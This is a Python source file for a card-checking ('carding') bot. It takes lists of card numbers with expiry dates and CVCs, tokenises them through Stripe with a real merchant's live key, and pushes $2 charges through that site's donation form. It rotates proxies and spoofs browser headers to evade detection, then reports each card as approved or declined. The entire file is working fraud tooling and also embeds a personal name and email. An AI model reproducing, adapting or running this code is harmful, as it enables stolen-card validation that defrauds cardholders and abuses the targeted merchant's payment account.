import requests
import random
import time
import os
import re
import json
from urllib.parse import urlparse

# Developer info
dev = "@mhitzxg"

# Configuration - YOUR ORIGINAL CONFIG
pkk = 'pk_live_51PvhEE07g9MK9dNZrYzbLv9pilyugsIQn0DocUZSpBWIIqUmbYavpiAj1iENvS7txtMT2gBnWVNvKk2FHul4yg1200ooq8sVnV'
fn = '2d74654657' 
aj = 'https://allcoughedup.com/wp-admin/admin-ajax.php'
ref = 'https://allcoughedup.com/registry/'

# Website identifiers - YOUR ORIGINAL
guid = 'beed82b8-9f7d-4585-8162-8fa6d92c010c1b6c9b'
muid = 'c70ee7f6-0caf-4555-b545-a1c2d4ee30eb88e211'
sid = 'a1772a92-62c1-4d2e-b5c3-e4939a09a4737b9bc9'

# User agent
us = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36'

def get_random_proxy():
    """Get a random proxy from proxy.txt file"""
    try:
        with open('proxy.txt', 'r') as f:
            proxies = f.readlines()
            if not proxies:
                return None
            
            proxy = random.choice(proxies).strip()
            
            # Auto-format common proxy formats
            if 'scrapegw.com' in proxy and '://' not in proxy:
                parts = proxy.split(':')
                if len(parts) >= 4:
                    host = parts[0]
                    port = parts[1]
                    username = parts[2]
                    password = parts[3]
                    proxy = f'http://{username}:{password}@{host}:{port}'
                elif len(parts) == 2:
                    proxy = f'http://{proxy}'
            elif '://' not in proxy:
                proxy = f'http://{proxy}'
            
            return {
                'http': proxy,
                'https': proxy
            }
    except:
        return None

# BIN lookup function - EXACTLY LIKE YOUR OLD FILE
def get_bin_info(card_number):
    """Get BIN information using binlist.net API"""
    if not card_number or len(card_number) < 6:
        return {
            'bank': 'Unavailable',
            'country': 'Unknown',
            'brand': 'Unknown',
            'type': 'Unknown',
            'level': 'Unknown',
            'emoji': '🏳️'
        }
    
    clean_card = ''.join(filter(str.isdigit, card_number))
    bin_code = clean_card[:6]
    
    try:
        time.sleep(0.2)
        
        headers = {
            'Host': 'lookup.binlist.net',
            'Cookie': '_ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        
        api_url = f"https://lookup.binlist.net/{bin_code}"
        response = requests.get(api_url, headers=headers, timeout=10, verify=False)
        
        if response.status_code == 200:
            try:
                data = response.json()
                
                bank_name = data.get('bank', {}).get('name', '')
                if not bank_name:
                    bank_name = 'Unavailable'
                
                country_name = data.get('country', {}).get('name', 'Unknown')
                country_code = data.get('country', {}).get('alpha2', '')
                
                brand = data.get('scheme', 'Unknown')
                
                card_type = data.get('type', '')
                if not card_type:
                    response_text = response.text
                    if '"type":"credit"' in response_text:
                        card_type = 'Credit'
                    elif '"type":"debit"' in response_text:
                        card_type = 'Debit'
                    else:
                        card_type = 'Unknown'
                
                emoji = get_country_emoji(country_code)
                
                return {
                    'bank': bank_name,
                    'country': country_name,
                    'brand': brand,
                    'type': card_type,
                    'level': brand,
                    'emoji': emoji
                }
                
            except:
                response_text = response.text
                
                bank_match = re.search(r'"name"\s*:\s*"([^"]+)"', response_text)
                bank_name = bank_match.group(1) if bank_match else 'Unavailable'
                
                country_match = re.search(r'"country".*?"name"\s*:\s*"([^"]+)"', response_text)
                country_name = country_match.group(1) if country_match else 'Unknown'
                
                code_match = re.search(r'"alpha2"\s*:\s*"([^"]+)"', response_text)
                country_code = code_match.group(1) if code_match else ''
                
                scheme_match = re.search(r'"scheme"\s*:\s*"([^"]+)"', response_text)
                brand = scheme_match.group(1) if scheme_match else 'Unknown'
                
                card_type = 'Unknown'
                if '"type":"credit"' in response_text:
                    card_type = 'Credit'
                elif '"type":"debit"' in response_text:
                    card_type = 'Debit'
                
                emoji = get_country_emoji(country_code)
                
                return {
                    'bank': bank_name,
                    'country': country_name,
                    'brand': brand,
                    'type': card_type,
                    'level': brand,
                    'emoji': emoji
                }
        else:
            return {
                'bank': 'Unavailable',
                'country': 'Unknown',
                'brand': 'Unknown',
                'type': 'Unknown',
                'level': 'Unknown',
                'emoji': '🏳️'
            }
            
    except Exception as e:
        return {
            'bank': 'Unavailable',
            'country': 'Unknown',
            'brand': 'Unknown',
            'type': 'Unknown',
            'level': 'Unknown',
            'emoji': '🏳️'
        }

def get_country_emoji(country_code):
    """Convert country code to emoji"""
    if not country_code or len(country_code) != 2:
        return '🏳️'
    
    try:
        country_code = country_code.upper()
        return ''.join(chr(127397 + ord(char)) for char in country_code)
    except:
        return '🏳️'

def extract_error_message(response):
    """Extract error message from response"""
    try:
        response_json = response.json()
        
        if 'errors' in response_json:
            error_msg = response_json['errors']
            if 'Stripe Error:' in error_msg:
                return error_msg.replace('Stripe Error:', '').strip()
            return error_msg
        
        elif 'error' in response_json:
            error_data = response_json['error']
            if isinstance(error_data, dict) and 'message' in error_data:
                return error_data['message']
            elif isinstance(error_data, str):
                return error_data
        
        elif 'message' in response_json:
            return response_json['message']
        
        return json.dumps(response_json)
        
    except json.JSONDecodeError:
        text = response.text.lower()
        
        error_patterns = [
            'declined',
            'invalid',
            'incorrect',
            'failed',
            'error',
            'cannot',
            'not',
            'unsuccessful'
        ]
        
        for pattern in error_patterns:
            if pattern in text:
                lines = response.text.split('\n')
                for line in lines:
                    if pattern in line.lower():
                        return line.strip()
        
        return response.text[:200] if response.text else "No error message found"

def test_charge(cc_line):
    start_time = time.time()
    
    try:
        time.sleep(random.uniform(0.5, 1.5))
        
        parts = cc_line.strip().split('|')
        if len(parts) < 4:
            ccn, mm, yy, cvc = "0000000000000000", "01", "2025", "123"
        else:
            ccn, mm, yy, cvc = parts[0], parts[1], parts[2], parts[3]
        
        # Get BIN information
        bin_info = get_bin_info(ccn[:6])
        
        # YOUR ORIGINAL STRIPE API LOGIC
        headers_stripe = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': us
        }

        # Generate random values for Stripe request
        time_on_page = random.randint(100000, 200000)
        client_session_id = f"{random.randint(10000000, 99999999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(100000000000, 999999999999)}"
        
        # Convert year if needed
        if len(str(yy)) == 2:
            yy_full = 2000 + int(yy)
        else:
            yy_full = int(yy)
        
        # Stripe API data - YOUR ORIGINAL DATA
        data_stripe = (
            f'type=card&card[number]={ccn}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy_full}&'
            f'guid={guid}&muid={muid}&sid={sid}&pasted_fields=number&'
            f'payment_user_agent=stripe.js%2F1f014c0569%3B+stripe-js-v3%2F1f014c0569%3B+card-element&'
            f'referrer={ref}&time_on_page={time_on_page}&'
            f'client_attribution_metadata[client_session_id]={client_session_id}&'
            f'client_attribution_metadata[merchant_integration_source]=elements&'
            f'client_attribution_metadata[merchant_integration_subtype]=card-element&'
            f'client_attribution_metadata[merchant_integration_version]=2017&'
            f'key={pkk}'
        )

        # Get proxy
        proxy_dict = get_random_proxy()
        
        # Make Stripe API request
        if proxy_dict:
            response_stripe = requests.post('https://api.stripe.com/v1/payment_methods', 
                                          headers=headers_stripe, 
                                          data=data_stripe,
                                          proxies=proxy_dict,
                                          timeout=30)
        else:
            response_stripe = requests.post('https://api.stripe.com/v1/payment_methods', 
                                          headers=headers_stripe, 
                                          data=data_stripe,
                                          timeout=30)
        
        elapsed_time = time.time() - start_time
        
        if response_stripe.status_code != 200:
            error_msg = extract_error_message(response_stripe)
            
            # CHECK FOR "Your card's security code is invalid." - APPROVED RESPONSE
            if "Your card's security code is incorrect." in error_msg or "security code is incorrect" in error_msg.lower():
                return f"""
✅ APPROVED CC

💳𝗖𝗖 ⇾ {ccn}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {error_msg}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge  - 2$

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f}𝘀

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
            
            # CHECK FOR "Your card has insufficient funds." - APPROVED RESPONSE
            if "Your card has insufficient funds." in error_msg or "insufficient funds" in error_msg.lower():
                return f"""
✅ APPROVED CC

💳𝗖𝗖 ⇾ {ccn}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {error_msg}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge  - 2$

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f}𝘀

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
            
            return f"""
❌ DECLINED CC

💳𝗖𝗖 ⇾ {ccn}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {error_msg}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge  - 2$

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f}𝘀

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
        
        stripe_json = response_stripe.json()
        
        if 'error' in stripe_json:
            error_msg = stripe_json['error'].get('message', 'Unknown Stripe Error')
            
            # CHECK FOR "Your card's security code is invalid." - APPROVED RESPONSE
            if "Your card's security code is incorrect." in error_msg or "security code is incorrect" in error_msg.lower():
                return f"""
✅ APPROVED CC

💳𝗖𝗖 ⇾ {ccn}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {error_msg}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge  - 2$

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f}𝘀

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
            
            # CHECK FOR "Your card has insufficient funds." - APPROVED RESPONSE
            if "Your card has insufficient funds." in error_msg or "insufficient funds" in error_msg.lower():
                return f"""
✅ APPROVED CC

💳𝗖𝗖 ⇾ {ccn}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {error_msg}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge  - 2$

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f}𝘀

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
            
            return f"""
❌ DECLINED CC

💳𝗖𝗖 ⇾ {ccn}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {error_msg}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge  - 2$

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f}𝘀

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
        
        payment_method_id = stripe_json["id"]
        
        # AJAX request cookies and headers
        cookies_ajax = {
            '__stripe_mid': muid,
            '__stripe_sid': sid,
        }

        headers_ajax = {
            'authority': 'allcoughedup.com',
            'accept': '*/*',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://allcoughedup.com',
            'referer': ref,
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': us,
            'x-requested-with': 'XMLHttpRequest',
        }

        params_ajax = {
            't': int(time.time() * 1000),
        }

        data_ajax = {
            'data': (
                f'__fluent_form_embded_post_id=3612&_fluentform_4_fluentformnonce={fn}&'
                f'_wp_http_referer=%2Fregistry%2F&names%5Bfirst_name%5D=diwas%20Khatri&'
                f'email=khatrieex%40gmail.com&custom-payment-amount=2&'
                f'description=Telegrm%20%3A-%20%40zx&payment_method=stripe&'
                f'__stripe_payment_method_id={payment_method_id}'
            ),
            'action': 'fluentform_submit',
            'form_id': '4',
        }

        time.sleep(random.uniform(1, 2))
        
        # Make final AJAX request
        if proxy_dict:
            response_ajax = requests.post(
                aj,
                params=params_ajax,
                cookies=cookies_ajax,
                headers=headers_ajax,
                data=data_ajax,
                proxies=proxy_dict,
                timeout=30
            )
        else:
            response_ajax = requests.post(
                aj,
                params=params_ajax,
                cookies=cookies_ajax,
                headers=headers_ajax,
                data=data_ajax,
                timeout=30
            )
        
        # Extract response
        error_msg = extract_error_message(response_ajax)
        elapsed_time = time.time() - start_time
        
        # Check for success
        if response_ajax.status_code == 200:
            try:
                final_json = response_ajax.json()
                
                if final_json.get('success', False):
                    return f"""
✅ APPROVED CC

💳𝗖𝗖 ⇾ {ccn}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ CHARGED 2$
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge  - 2$

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f}𝘀

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
                else:
                    response_text = response_ajax.text.lower()
                    
                    # CHECK FOR "Your card's security code is invalid." - APPROVED RESPONSE
                    if "Your card's security code is incorrect." in response_ajax.text or "security code is incorrect" in response_text:
                        return f"""
✅ APPROVED CC

💳𝗖𝗖 ⇾ {ccn}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {error_msg}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge  - 2$

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f}𝘀

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
                    
                    # CHECK FOR "Your card has insufficient funds." - APPROVED RESPONSE
                    if "Your card has insufficient funds." in response_ajax.text or "insufficient funds" in response_text:
                        return f"""
✅ APPROVED CC

💳𝗖𝗖 ⇾ {ccn}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {error_msg}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge  - 2$

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f}𝘀

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
                    
                    if any(keyword in response_text for keyword in ['payment successful', 'thank you', 'approved', 'charged']):
                        return f"""
✅ APPROVED CC

💳𝗖𝗖 ⇾ {ccn}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ CHARGED 2$
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge  - 2$

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f}𝘀

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
                    else:
                        return f"""
❌ DECLINED CC

💳𝗖𝗖 ⇾ {ccn}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {error_msg}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge  - 2$

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f}𝘀

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
                
            except json.JSONDecodeError:
                response_text = response_ajax.text.lower()
                
                # CHECK FOR "Your card's security code is invalid." - APPROVED RESPONSE
                if "Your card's security code is incorrect." in response_ajax.text or "security code is incorrect" in response_text:
                    return f"""
✅ APPROVED CC

💳𝗖𝗖 ⇾ {ccn}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {error_msg}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge  - 2$

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f}𝘀

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
                
                # CHECK FOR "Your card has insufficient funds." - APPROVED RESPONSE
                if "Your card has insufficient funds." in response_ajax.text or "insufficient funds" in response_text:
                    return f"""
✅ APPROVED CC

💳𝗖𝗖 ⇾ {ccn}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {error_msg}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge  - 2$

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f}𝘀

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
                
                if any(keyword in response_text for keyword in ['payment successful', 'thank you', 'approved', 'charged', 'success']):
                    return f"""
✅ APPROVED CC

💳𝗖𝗖 ⇾ {ccn}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ CHARGED 2$
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge  - 2$

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f}𝘀

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
                else:
                    return f"""
❌ DECLINED CC

💳𝗖𝗖 ⇾ {ccn}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {error_msg}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge  - 2$

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f}𝘀

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
        else:
            error_msg = extract_error_message(response_ajax)
            
            # CHECK FOR "Your card's security code is invalid." - APPROVED RESPONSE
            if "Your card's security code is incorrect." in error_msg or "security code is incorrect" in error_msg.lower():
                return f"""
✅ APPROVED CC

💳𝗖𝗖 ⇾ {ccn}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {error_msg}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge  - 2$

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f}𝘀

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
            
            # CHECK FOR "Your card has insufficient funds." - APPROVED RESPONSE
            if "Your card has insufficient funds." in error_msg or "insufficient funds" in error_msg.lower():
                return f"""
✅ APPROVED CC

💳𝗖𝗖 ⇾ {ccn}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {error_msg}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge  - 2$

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f}𝘀

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
            
            return f"""
❌ DECLINED CC

💳𝗖𝗖 ⇾ {ccn}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {error_msg}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge  - 2$

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f}𝘀

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
                
    except Exception as e:
        elapsed_time = time.time() - start_time
        return f"""
❌ ERROR

💳𝗖𝗖 ⇾ {cc_line.strip()}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {str(e)}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge  - 2$

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: Unknown - Unknown - Unknown
🏛️𝗕𝗮𝗻𝗸: Unavailable
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: Unknown 🏳️
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f}𝘀

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""

# Single CC check function for /st command
def check_single_cc(cc_line):
    return test_charge(cc_line)

# Mass CC check function for /mst command  
def check_mass_cc(cc_lines):
    """Process multiple CCs - EXACTLY LIKE YOUR OLD FILE"""
    results = []
    for cc_line in cc_lines:
        try:
            result = test_charge(cc_line.strip())
            results.append(result)
            # Add delay between requests
            time.sleep(random.uniform(1, 2))
        except Exception as e:
            results.append(f"❌ Error processing card: {str(e)}")
    
    return results
